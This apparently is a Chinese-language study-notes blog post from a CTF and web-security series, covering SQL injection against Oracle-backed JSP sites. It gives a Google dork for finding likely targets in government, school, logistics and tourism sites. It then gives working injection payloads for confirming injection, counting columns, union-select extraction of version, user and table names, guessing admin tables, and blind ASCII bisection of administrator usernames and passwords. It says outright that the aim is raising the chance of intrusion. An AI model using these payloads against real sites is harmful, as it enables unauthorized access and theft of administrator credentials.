---
layout:     post
title:      Web笔记（四）SQL注入之Oracle
subtitle:   这个系列是整理学习安全的笔记，包括Web和PWN的一些知识。本章是Oracle的SQL注入。
date:       2020-11-29
author:     K4ys0n
header-img: img/post-bg-rwd.jpg
catalog:    true
tags:
    - CTF
    - web
    - 网络安全
    - 学习笔记
    - SQL注入
    - Oracle
---



##  0x00 Oracle简介

oracle数据库系统时美国ORACLE公司（甲骨文）提供的以分布式数据库为核心的一组软件产品，是目前世界上使用最广泛的数据库管理系统。基于“客户端/服务器”模式结构，客户端应用程序与用户交互，接收用户信息，并向服务器发送请求，服务器系统负责管理数据信息和各种操作数据的活动。



## 0x01 Oracle特点

- 支持多用户、大事务量的处理

- 数据安全性和完整性的有效控制

- 支持分布式数据处理

- 移植性强



## 0x02 Oracle常用场景

可能存在oracle注入的有：

- 物流

- 旅游

- 政府

- 学校

一般是jsp+oracle，可以用谷歌语法查找：`inurl:jsp?id= 旅游`

为了强化记忆是jsp文件，跟php作对比我在后面都用`jsp?id=1`示例。

## 0x03 SQL注入攻击

#### 1. 判断注入

```
jsp?id=1 and 1=1 -- 
jsp?id=1 and 1=2 -- 
```

#### 2. 判断oracle数据库

```
jsp?id=1 and exists(select * from dual) -- 
jsp?id=1 and exists(select * from user_tables) -- 
```

#### 3. 判断列数

```
jsp?id=1 order by 11 --  	返回正常
jsp?id=1 order by 12 -- 	返回错误
```

说明有11列。

#### 4. 获取数据类型不匹配的列

```
jsp?id=-1 union select null,null,null,null,null,null,null,null,null,null,null from dual
```

逐个代替为数字1或者字符'1'，来确定是数值还是字符类型，然后在字符类型的地方插入查询语句。

#### 5. 获取基本信息

```
# 获取数据库版本
(select banner from sys.v_$version where rownum=1)

# 获取操作系统版本
(select member from v$logfile where rownum=1)

# 获取连接数据库的当前用户
(select SYS_CONTEXT ('USERENV', 'CURRENT_USER') from dual)

# 获取数据库
(select owner from all_tables where rownum=1)

# 例如获取数据库版本信息：
jsp?id=100 union select null,(select banner from sys.v_$version where rownum=1),null,null,null,null,null,null,null,null,null from dual

# 例如获取第一张表
jsp?id=100 union select null,(select table_name from user_tables where rownum=1),null,null,null,null,null,null,null,null,null from dual

# 例如获取第二张表
jsp?id=100 union select null,(select table_name from user_tables where rownum=1 and table_name<>'ACCESS'),null,null,null,null,null,null,null,null,null from dual
以此类推
```

另一种注入方式判断数据库中的表：

```
jsp?id=1 and (select count(*) from admin)<>0
```

- 如果返回正常，说明存在admin表。

- 如果返回错误，可将admin改成username、manager等常用表名继续猜解，也即跑表名字典。

#### 6. 判断该网站下有几个管理员

如果有多个的话可以加大成功入侵的几率。

```
jsp?id=1 and (select count(*) from admin)=1
```

返回正常，说明只有一个管理员

#### 7. 指定表名获取列名

```
jsp?id=1 and (select count(name) from admin)>=0
```

返回正常，说明存在name字段

#### 8. 采用ascii码折半法猜解管理员账号密码

- 判断管理员名字长度

```
jsp?id=1 and(select count(*) from admin where length(name)>=5)=1
```

其中length()函数用于求字符串的长度，此处猜测用户名的长度和5比较，即猜测是否由5个字符组成

- 判断名字中各个位置的字符

```
jsp?id=1 and (select count(*) from admin where ascii(substr(name,1,1))>=97)=1
```

其中substr()函数用于截取字符串，ascii()函数用于获取字符的ascii码。